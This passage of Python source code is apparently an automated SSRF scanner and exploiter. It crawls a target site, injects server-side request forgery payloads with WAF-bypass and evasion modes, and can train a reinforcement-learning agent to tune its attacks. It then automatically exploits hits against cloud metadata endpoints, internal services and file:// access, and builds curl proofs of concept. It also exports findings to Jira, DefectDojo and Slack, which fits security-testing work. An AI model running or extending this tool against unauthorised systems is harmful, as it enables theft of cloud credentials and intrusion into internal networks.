                    if any(func in script_content for func in ['fetch(', 'xmlhttprequest', 'ajax', '$.get', '$.post']):
                        return True
            
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if any(char in href for char in ['?', '&', '=']):
                    return True
                    
            return False
        except Exception as e:
            return False
    
    def crawl(self, url, depth=2):
        if depth <= 0 or url in self.crawled_urls or self.is_static_resource(url):
            return
            
        self.crawled_urls.add(url)
        
        try:
            response = self.request_handler.get(url)
            if not response or 'text/html' not in response.headers.get('Content-Type', ''):
                return
                
            if self.analyze_endpoint(url):
                self.high_confidence_endpoints.append(url)
                
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            
            for link in links:
                href = link['href']
                if href.startswith('http'):
                    new_url = href
                else:
                    new_url = urljoin(url, href)
                    
                if urlparse(new_url).netloc == urlparse(url).netloc:
                    self.crawl(new_url, depth - 1)
        except Exception as e:
            pass

@app.task
def crawl_with_playwright(url, mode='fast', force_recrawl=False):
    analyzer = ContextualAnalyzer(mode=mode, force_recrawl=force_recrawl)
    flows = analyzer.discover_flows(url)
    return flows

@app.task
def train_rl_model(url, param, request_handler_config, payload_manager_config, fine_tune=False):
    request_handler = RequestHandler(**request_handler_config)
    payload_manager = PayloadManager(**payload_manager_config)
    
    agent = RLAgent()
    model = agent.train(url, param, request_handler, payload_manager, fine_tune=fine_tune)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    model_path = f"models/rl_model_{timestamp}.zip"
    agent.save_model(model_path)
    
    return model_path

@app.task
def exploit_target(url, param, payload, request_handler_config):
    request_handler = RequestHandler(**request_handler_config)
    
    exploiter = ControlledExploiter(request_handler)
    
    if "169.254.169.254" in payload or "metadata.google.internal" in payload:
        results = exploiter.exploit_cloud_metadata(url, param, payload)
    elif "127.0.0.1" in payload:
        results = exploiter.exploit_internal_service(url, param, payload)
    elif "file://" in payload:
        results = exploiter.exploit_file_access(url, param, payload)
    else:
        results = []
    
    return results

class SSRFDetector:
    def __init__(self, target_url, timeout=15, threads=3, rate_limit=5, payload_file=None, 
                 use_rl=False, contextual_mode='fast', force_recrawl=False, evasion_mode='basic'):
        self.target_url = target_url
        self.timeout = timeout
        self.threads = threads
        self.results = []
        self.detected_os = "Unknown"
        self.successful_payloads = []
        self.use_rl = use_rl
        self.contextual_mode = contextual_mode
        self.force_recrawl = force_recrawl
        self.evasion_mode = evasion_mode
        
        self.payload_manager = PayloadManager(payload_file)
        self.adaptive_payload_generator = AdaptivePayloadGenerator(self.successful_payloads)
        self.request_handler = RequestHandler(timeout, rate_limit, evasion_mode)
        self.crawler = Crawler(self.request_handler)
        self.behavior_analyzer = BehaviorAnalyzer(self.request_handler)
        self.callback_server = CallbackServer()
        self.blind_ssrf_detector = BlindSSRFDetector(self.callback_server)
        self.ml_model_manager = MLModelManager()
        self.integration_manager = IntegrationManager()
        self.contextual_analyzer = ContextualAnalyzer(contextual_mode, force_recrawl)
        self.controlled_exploiter = ControlledExploiter(self.request_handler)
        self.risk_assessor = RiskAssessor()
        
        if use_rl:
            self.rl_agent = RLAgent()
        
        self.os_indicators = {
            "linux": ["Linux", "linux", "Ubuntu", "Debian", "CentOS", "Red Hat", "Fedora", "kernel", "GNU", "bash", "apt", "yum", "systemd"],
            "windows": ["Windows", "Microsoft", "IIS", "Win32", "ASP.NET", "X-Powered-By: ASP.NET", "Win64", "SERVER_SOFTWARE: Microsoft", "Microsoft-HTTPAPI"],
            "macos": ["Mac OS X", "Darwin", "CFNetwork", "Macintosh"]
        }
    
    def check_os_indicators(self, response):
        if not response:
            return "Unknown"
            
        content = response.text.lower()
        headers = str(response.headers).lower()
        for os_name, indicators in self.os_indicators.items():
            for indicator in indicators:
                if indicator.lower() in content or indicator.lower() in headers:
                    return os_name.capitalize()
        return "Unknown"
    
    def test_parameter_ssrf(self, param, value, url):
        results = []
        
        self.behavior_analyzer.establish_baseline(url, param)
        
        waf_type = self.request_handler.profile_waf(url)
        waf_bypass_techniques = self.request_handler.get_waf_bypass_techniques()
        
        if self.use_rl and self.rl_agent:
            try:
                fine_tune = os.path.exists(self.rl_agent.base_model_path)
                
                task = train_rl_model.delay(
                    url, param, 
                    {
                        'timeout': self.timeout,
                        'rate_limit': self.request_handler.rate_limit,
                        'evasion_mode': self.evasion_mode
                    },
                    {},
                    fine_tune=fine_tune
                )
                
                model_path = task.get(timeout=300)
                
                if model_path and os.path.exists(model_path):
                    self.rl_agent.load_model(model_path)
                    
                    env = RLEnvironment(url, param, self.request_handler, self.payload_manager)
                    observation = env.reset()
                    
                    for _ in range(10):
                        action = self.rl_agent.predict(observation)
                        observation, reward, done, info = env.step(action)
                        
                        if done or reward >= 100:
                            if 'response' in info and info['response']:
                                response = info['response']
                                
                                self.successful_payloads.append(info['payload'])
                                
                                os_detected = self.check_os_indicators(response)
                                
                                behavior_analysis = self.behavior_analyzer.analyze_response(response)
                                
                                ml_result = self.ml_model_manager.predict(response.text)
                                
                                confidence = self.calculate_confidence(response, info['payload'], behavior_analysis, ml_result)
                                
                                exploitation_task = exploit_target.delay(
                                    url, param, info['payload'],
                                    {
                                        'timeout': self.timeout,
                                        'rate_limit': self.request_handler.rate_limit,
                                        'evasion_mode': self.evasion_mode
                                    }
                                )
                                
                                exploitation_results = exploitation_task.get(timeout=60)
                                
                                risk_assessment = self.risk_assessor.assess_risk({
                                    'url': url,
                                    'parameter': param,
                                    'payload': info['payload'],
                                    'confidence': confidence
                                }, exploitation_results)
                                
                                poc = self.controlled_exploiter.generate_poc({
                                    'url': url,
                                    'parameter': param,
                                    'payload': info['payload']
                                }, exploitation_results)
                                
                                result = {
                                    "parameter": param,
                                    "payload": info['payload'],
                                    "status_code": response.status_code,
                                    "evidence": self.get_ssrf_evidence(response),
                                    "os_detected": os_detected,
                                    "url": url,
                                    "confidence": confidence,
                                    "behavior_analysis": behavior_analysis,
                                    "ml_result": ml_result,
                                    "exploitation_results": exploitation_results,
                                    "risk_assessment": risk_assessment,
                                    "poc": poc
                                }
                                results.append(result)
                                self.results.append(result)
                                if os_detected != "Unknown":
                                    self.detected_os = os_detected
                                
                                break
            except Exception as e:
                pass
        
        if not results:
            for payload in self.payload_manager.ssrf_payloads:
                if waf_bypass_techniques:
                    bypass_techniques = [getattr(self.payload_manager, tech) for tech in waf_bypass_techniques if hasattr(self.payload_manager, tech)]
                else:
                    bypass_techniques = self.payload_manager.waf_bypass_techniques
                
                bypass_payloads = self.payload_manager.generate_waf_bypass_payloads(payload)
                
                if self.successful_payloads:
                    adaptive_payloads = self.adaptive_payload_generator.generate_variants(payload)
                    bypass_payloads.extend(adaptive_payloads)
                
                for bypass_payload in bypass_payloads:
                    try:
                        if param in url:
                            test_url = url.replace(f"{param}={value}", f"{param}={quote(bypass_payload)}")
                            response = self.request_handler.get(test_url, allow_redirects=False)
                        else:
                            data = {param: bypass_payload}
                            response = self.request_handler.post(url, data=data, allow_redirects=False)
                        
                        if response and self.is_ssrf_response(response):
                            self.successful_payloads.append(bypass_payload)
                            
                            os_detected = self.check_os_indicators(response)
                            
                            behavior_analysis = self.behavior_analyzer.analyze_response(response)
                            
                            ml_result = self.ml_model_manager.predict(response.text)
                            
                            confidence = self.calculate_confidence(response, bypass_payload, behavior_analysis, ml_result)
                            
                            exploitation_task = exploit_target.delay(
                                url, param, bypass_payload,
                                {
                                    'timeout': self.timeout,
                                    'rate_limit': self.request_handler.rate_limit,
                                    'evasion_mode': self.evasion_mode
                                }
                            )
                            
                            exploitation_results = exploitation_task.get(timeout=60)
                            
                            risk_assessment = self.risk_assessor.assess_risk({
                                'url': url,
                                'parameter': param,
                                'payload': bypass_payload,
                                'confidence': confidence
                            }, exploitation_results)
                            
                            poc = self.controlled_exploiter.generate_poc({
                                'url': url,
                                'parameter': param,
                                'payload': bypass_payload
                            }, exploitation_results)
                            
                            result = {
                                "parameter": param,
                                "payload": bypass_payload,
                                "status_code": response.status_code,
                                "evidence": self.get_ssrf_evidence(response),
                                "os_detected": os_detected,
                                "url": url,
                                "confidence": confidence,
                                "behavior_analysis": behavior_analysis,
                                "ml_result": ml_result,
                                "exploitation_results": exploitation_results,
                                "risk_assessment": risk_assessment,
                                "poc": poc
                            }
                            results.append(result)
                            self.results.append(result)
                            if os_detected != "Unknown":
                                self.detected_os = os_detected
                    except Exception as e:
                        continue
        
        try:
            self.callback_server.clear_callbacks()
            
            dns_payload = self.blind_ssrf_detector.generate_dns_payload()
            if param in url:
                test_url = url.replace(f"{param}={value}", f"{param}={quote(dns_payload)}")
                self.request_handler.get(test_url, allow_redirects=False)
            else:
                data = {param: dns_payload}
                self.request_handler.post(url, data=data, allow_redirects=False)
            
            if self.blind_ssrf_detector.check_dns_callback(dns_payload):
                result = {
                    "parameter": param,
                    "payload": dns_payload,
                    "status_code": 0,
                    "evidence": ["DNS callback received - blind SSRF confirmed"],
                    "os_detected": "Unknown",
                    "url": url,
                    "confidence": 85,
                    "behavior_analysis": {"time_anomaly": True, "size_anomaly": False, "time_score": 80, "size_score": 0},
                    "ml_result": {"normal": 0.1, "ssrf": 0.8, "error": 0.1},
                    "exploitation_results": [],
                    "risk_assessment": {
                        'score': 75,
                        'level': 'High',
                        'factors': ['Blind SSRF confirmed via DNS callback']
                    },
                    "poc": f"# DNS Callback SSRF PoC\n\n## Vulnerable Parameter: {param}\n\n## Payload: {dns_payload}\n\n## curl command:\ncurl \"{url.replace(f'{param}=test', f'{param}={quote(dns_payload)}')}\"\n\n"
                }
                results.append(result)
                self.results.append(result)
            
            self.callback_server.clear_callbacks()
            
            http_payload = self.blind_ssrf_detector.generate_http_payload()
            if param in url:
                test_url = url.replace(f"{param}={value}", f"{param}={quote(http_payload)}")
                self.request_handler.get(test_url, allow_redirects=False)
            else:
                data = {param: http_payload}
                self.request_handler.post(url, data=data, allow_redirects=False)
            
            if self.blind_ssrf_detector.check_http_callback(http_payload):
                result = {
                    "parameter": param,
                    "payload": http_payload,
                    "status_code": 0,
                    "evidence": ["HTTP callback received - blind SSRF confirmed"],
                    "os_detected": "Unknown",
                    "url": url,
                    "confidence": 85,
                    "behavior_analysis": {"time_anomaly": True, "size_anomaly": False, "time_score": 80, "size_score": 0},
                    "ml_result": {"normal": 0.1, "ssrf": 0.8, "error": 0.1},
                    "exploitation_results": [],
                    "risk_assessment": {
                        'score': 75,
                        'level': 'High',
                        'factors': ['Blind SSRF confirmed via HTTP callback']
                    },
                    "poc": f"# HTTP Callback SSRF PoC\n\n## Vulnerable Parameter: {param}\n\n## Payload: {http_payload}\n\n## curl command:\ncurl \"{url.replace(f'{param}=test', f'{param}={quote(http_payload)}')}\"\n\n"
                }
                results.append(result)
                self.results.append(result)
        except Exception as e:
            pass
            
        return results
    
    def calculate_confidence(self, response, payload, behavior_analysis, ml_result):
        confidence = 30
        
        content = response.text.lower()
        
        if "ami-id" in content or "instance-id" in content:
            confidence += 30
        if "computeMetadata" in content:
            confidence += 30
        if "aliyun" in content:
            confidence += 30
        if "root:" in content and "/bin/bash" in content:
            confidence += 40
        if "welcome to nginx" in content:
            confidence += 25
        if "apache" in content:
            confidence += 25
        if "iis" in content:
            confidence += 25
        
        if "169.254.169.254" in payload:
            confidence += 20
        if "metadata.google.internal" in payload:
            confidence += 20
        if "file:///" in payload:
            confidence += 15
        
        confidence += behavior_analysis.get('time_score', 0) * 0.3
        confidence += behavior_analysis.get('size_score', 0) * 0.3
        
        confidence += ml_result.get('ssrf', 0) * 50
        
        if response.elapsed.total_seconds() > 5:
            confidence += 10
        
        return min(confidence, 100)
    
    def is_ssrf_response(self, response):
        if response.status_code in [200, 301, 302, 307, 500]:
            content = response.text.lower()
            headers = str(response.headers).lower()
            if any(indicator in content for indicator in ["ami-id", "instance-id", "aws_access", "computeMetadata", "project-id", "subscription-name", "aliyun"]):
                return True
            if any(indicator in content for indicator in ["welcome to nginx", "apache", "iis", "server at", "http/1.1 200", "http/1.0 200"]):
                return True
            if "root:" in content and "bin/bash" in content:
                return True
            if any(indicator in content for indicator in ["could not resolve host", "name resolution failed", "no address associated with hostname", "connection refused"]):
                return True
            if response.elapsed.total_seconds() > 5:
                return True
        return False
    
    def get_ssrf_evidence(self, response):
        evidence = []
        content = response.text
        if "ami-id" in content:
            evidence.append("AWS metadata detected")
        if "computeMetadata" in content:
            evidence.append("GCP metadata detected")
        if "aliyun" in content:
            evidence.append("AliCloud metadata detected")
        if "root:" in content and "/bin/bash" in content:
            evidence.append("Local file access (possibly /etc/passwd)")
        if "welcome to nginx" in content:
            evidence.append("Local Nginx service detected")
        if "apache" in content.lower():
            evidence.append("Local Apache service detected")
        if "iis" in content.lower():
            evidence.append("Local IIS service detected")
        if response.elapsed.total_seconds() > 5:
            evidence.append(f"Slow response ({response.elapsed.total_seconds():.2f}s) - possible internal request")
        return evidence if evidence else ["Response behavior indicates potential SSRF"]
    
    def detect_parameters(self, url):
        try:
            base_response = self.request_handler.get(url)
            if not base_response:
                return []
                
            self.detected_os = self.check_os_indicators(base_response)
            form_params = self.extract_form_parameters(base_response)
            url_params = self.extract_url_parameters(url)
            all_params = list(set(form_params + url_params))
            return all_params
        except Exception as e:
            return []
    
    def extract_form_parameters(self, response):
        params = []
        try:
            soup = BeautifulSoup(response.text, 'html.parser')
            for form in soup.find_all('form'):
                for input_tag in form.find_all('input'):
                    if input_tag.get('name'):
                        params.append(input_tag.get('name'))
                for textarea in form.find_all('textarea'):
                    if textarea.get('name'):
                        params.append(textarea.get('name'))
                for select in soup.find_all('select'):
                    if select.get('name'):
                        params.append(select.get('name'))
        except Exception as e:
            form_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            params.extend(re.findall(form_pattern, response.text))
        return params
    
    def extract_url_parameters(self, url):
        parsed_url = urlparse(url)
        if parsed_url.query:
            return [param.split('=')[0] for param in parsed_url.query.split('&')]
        return []
    
    def export_results(self, format_type):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ssrf_results_{timestamp}"
        
        if format_type.lower() == 'json':
            with open(f"{filename}.json", 'w') as f:
                json.dump(self.results, f, indent=4)
            print(f"[+] Results exported to {filename}.json")
            
        elif format_type.lower() == 'csv':
            with open(f"{filename}.csv", 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['URL', 'Parameter', 'Payload', 'Status Code', 'OS Detected', 'Confidence', 'Evidence'])
                for result in self.results:
                    writer.writerow([
                        result['url'],
                        result['parameter'],
                        result['payload'],
                        result['status_code'],
                        result['os_detected'],
                        result['confidence'],
                        '; '.join(result['evidence'])
                    ])
            print(f"[+] Results exported to {filename}.csv")
            
        elif format_type.lower() == 'xml':
            root = ET.Element("SSRF_Results")
            for result in self.results:
                result_elem = ET.SubElement(root, "Result")
                ET.SubElement(result_elem, "URL").text = result['url']
                ET.SubElement(result_elem, "Parameter").text = result['parameter']
                ET.SubElement(result_elem, "Payload").text = result['payload']
                ET.SubElement(result_elem, "StatusCode").text = str(result['status_code'])
                ET.SubElement(result_elem, "OSDetected").text = result['os_detected']
                ET.SubElement(result_elem, "Confidence").text = str(result['confidence'])
                evidence_elem = ET.SubElement(result_elem, "Evidence")
                for evidence in result['evidence']:
                    ET.SubElement(evidence_elem, "Item").text = evidence
            
            tree = ET.ElementTree(root)
            tree.write(f"{filename}.xml")
            print(f"[+] Results exported to {filename}.xml")
            
        elif format_type.lower() == 'txt':
            with open(f"{filename}.txt", 'w') as f:
                f.write(f"SSRF Scan Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Target: {self.target_url}\n")
                f.write(f"Detected OS: {self.detected_os}\n")
                f.write("="*50 + "\n\n")
                
                for result in self.results:
                    f.write(f"URL: {result['url']}\n")
                    f.write(f"Parameter: {result['parameter']}\n")
                    f.write(f"Payload: {result['payload']}\n")
                    f.write(f"Status Code: {result['status_code']}\n")
                    f.write(f"OS Detected: {result['os_detected']}\n")
                    f.write(f"Confidence: {result['confidence']}%\n")
                    f.write("Evidence:\n")
                    for evidence in result['evidence']:
                        f.write(f"  - {evidence}\n")
                    f.write("-"*50 + "\n\n")
            print(f"[+] Results exported to {filename}.txt")
            
        elif format_type.lower() == 'html':
            reporter = InteractiveHTMLReporter(self.results, self.target_url, self.detected_os)
            reporter.save_report(f"{filename}.html")
            print(f"[+] Results exported to {filename}.html")
    
    def integrate_with_platforms(self, config):
        if not config:
            return
            
        if 'jira' in config:
            for vuln in self.results:
                if vuln['confidence'] >= 70:
                    issue_key = self.integration_manager.push_to_jira(vuln, config['jira'])
                    if issue_key:
                        print(f"[+] Created Jira issue {issue_key} for vulnerability in {vuln['url']}")
        
        if 'defectdojo' in config:
            for vuln in self.results:
                if vuln['confidence'] >= 70:
                    finding_id = self.integration_manager.push_to_defectdojo(vuln, config['defectdojo'])
                    if finding_id:
                        print(f"[+] Created DefectDojo finding {finding_id} for vulnerability in {vuln['url']}")
        
        if 'slack' in config:
            high_confidence_count = len([r for r in self.results if r['confidence'] >= 70])
            medium_confidence_count = len([r for r in self.results if 40 <= r['confidence'] < 70])
            low_confidence_count = len([r for r in self.results if r['confidence'] < 40])
            
            summary = {
                'target_url': self.target_url,
                'scan_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': len(self.results),
                'high_confidence_count': high_confidence_count,
                'medium_confidence_count': medium_confidence_count,
                'low_confidence_count': low_confidence_count
            }
            
            success = self.integration_manager.send_to_slack(summary, config['slack'])
            if success:
                print("[+] Sent scan summary to Slack")
    
    def run_scan(self):
        print(f"[*] Starting callback servers for blind SSRF detection...")
        self.callback_server.start()
        
        print(f"[*] Crawling {self.target_url} for high-value endpoints...")
        self.crawler.crawl(self.target_url)
        print(f"[+] Found {len(self.crawler.high_confidence_endpoints)} high-confidence endpoints")
        
        print(f"[*] Discovering application flows...")
        
        if self.contextual_mode == 'fast':
            flows = self.contextual_analyzer.discover_flows(self.target_url)
        else:
            task = crawl_with_playwright.delay(self.target_url, self.contextual_mode, self.force_recrawl)
            flows = task.get(timeout=300)
        
        print(f"[+] Discovered {len(flows)} application flows")
        
        print(f"[*] Identifying sensitive flows...")
        sensitive_flows = self.contextual_analyzer.identify_sensitive_flows(flows)
        print(f"[+] Identified {len(sensitive_flows)} sensitive flows")
        
        test_urls = list(set(self.crawler.high_confidence_endpoints + [flow['url'] for flow in sensitive_flows]))
        
        vulnerabilities = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for url in test_urls:
                parameters = self.detect_parameters(url)
                for param in parameters:
                    futures.append(executor.submit(self.test_parameter_ssrf, param, "test", url))
                    
            for future in as_completed(futures):
                try:
                    results = future.result()
                    vulnerabilities.extend(results)
                except Exception as e:
                    continue
        
        self.callback_server.stop()
        
        if vulnerabilities:
            print(f"\n[+] Found {len(vulnerabilities)} SSRF vulnerabilities!")
            print(f"[+] Detected OS: {self.detected_os}\n")
            
            high_confidence_results = [r for r in vulnerabilities if r['confidence'] >= 70]
            
            if high_confidence_results:
                print(f"[+] {len(high_confidence_results)} high-confidence vulnerabilities (confidence >= 70%):\n")
                for vuln in high_confidence_results:
                    print(f"URL: {vuln['url']}")
                    print(f"Parameter: {vuln['parameter']}")
                    print(f"Payload: {vuln['payload']}")
                    print(f"Status Code: {vuln['status_code']}")
                    print(f"OS Detected: {vuln['os_detected']}")
                    print(f"Confidence: {vuln['confidence']}%")
                    
                    if 'risk_assessment' in vuln:
                        print(f"Risk Level: {vuln['risk_assessment']['level']} (Score: {vuln['risk_assessment']['score']})")
                    
                    print("Evidence:")
                    for evidence in vuln['evidence']:
                        print(f"  - {evidence}")
                    
                    if 'exploitation_results' in vuln and vuln['exploitation_results']:
                        print("Exploitation Results:")
                        for result in vuln['exploitation_results']:
                            print(f"  - {result['type']}: {result['data']} (Risk: {result['risk']})")
                    
                    print("-" * 50)
            else:
                print("[-] No high-confidence vulnerabilities found")
        else:
            print("\n[-] No SSRF vulnerabilities detected")
            print(f"[*] Detected OS: {self.detected_os}")

def manage_models(args):
    agent = RLAgent()
    
    if args.list_models:
        print("[+] Available RL models:")
        if os.path.exists("models"):
            for file in os.listdir("models"):
                if file.endswith(".zip"):
                    print(f"  - {file}")
        else:
            print("  No models found")
    
    if args.download_base_model:
        agent.download_base_model()
    
    if args.fine_tune:
        print(f"[+] Fine-tuning RL model for {args.fine_tune}")
        request_handler = RequestHandler()
        payload_manager = PayloadManager()
        
        parsed_url = urlparse(args.fine_tune)
        if parsed_url.query:
            param = parsed_url.query.split('=')[0]
        else:
            param = "url"
        
        agent.train(args.fine_tune, param, request_handler, payload_manager, fine_tune=True)
        print("[+] Model fine-tuned successfully")

def main():
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    scan_parser = subparsers.add_parser('scan', help='Scan a target for SSRF vulnerabilities')
    scan_parser.add_argument("-u", "--url", required=True, help="Target URL")
    scan_parser.add_argument("-t", "--timeout", type=int, default=15, help="Timeout")
    scan_parser.add_argument("--threads", type=int, default=3, help="Threads")
    scan_parser.add_argument("--rate", type=int, default=5, help="Rate limit (requests per second)")
    scan_parser.add_argument("--export", choices=['json', 'csv', 'xml', 'txt', 'html'], help="Export results format")
    scan_parser.add_argument("--payloads", help="Path to custom payload file (JSON)")
    scan_parser.add_argument("--integration", help="Path to integration configuration file (JSON)")
    scan_parser.add_argument("--rl", action="store_true", help="Use reinforcement learning for attack optimization")
    scan_parser.add_argument("--contextual-mode", choices=['fast', 'deep'], default='fast', help="Contextual analysis mode")
    scan_parser.add_argument("--force-recrawl", action="store_true", help="Force recrawl even if cache exists")
    scan_parser.add_argument("--evasion-mode", choices=['basic', 'aggressive'], default='basic', help="Evasion mode")
    
    model_parser = subparsers.add_parser('manage-models', help='Manage RL models')
    model_parser.add_argument("--list-models", action="store_true", help="List available models")
    model_parser.add_argument("--download-base-model", action="store_true", help="Download base RL model")
    model_parser.add_argument("--fine-tune", help="Fine-tune model for a specific target")
    
    args = parser.parse_args()
    
    if args.command == 'scan':
        if not args.url.startswith(('http://', 'https://')):
            print("[-] URL must start with http:// or https://")
            sys.exit(1)
        
        integration_config = None
        if args.integration:
            try:
                with open(args.integration, 'r') as f:
                    integration_config = json.load(f)
            except Exception as e:
                print(f"[-] Error loading integration config: {e}")
                integration_config = None
        
        scanner = SSRFDetector(
            args.url, 
            args.timeout, 
            args.threads, 
            args.rate, 
            args.payloads, 
            args.rl,
            args.contextual_mode,
            args.force_recrawl,
            args.evasion_mode
        )
        scanner.run_scan()
        
        if args.export:
            scanner.export_results(args.export)
        
        if integration_config:
            scanner.integrate_with_platforms(integration_config)
    
    elif args.command == 'manage-models':
        manage_models(args)
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
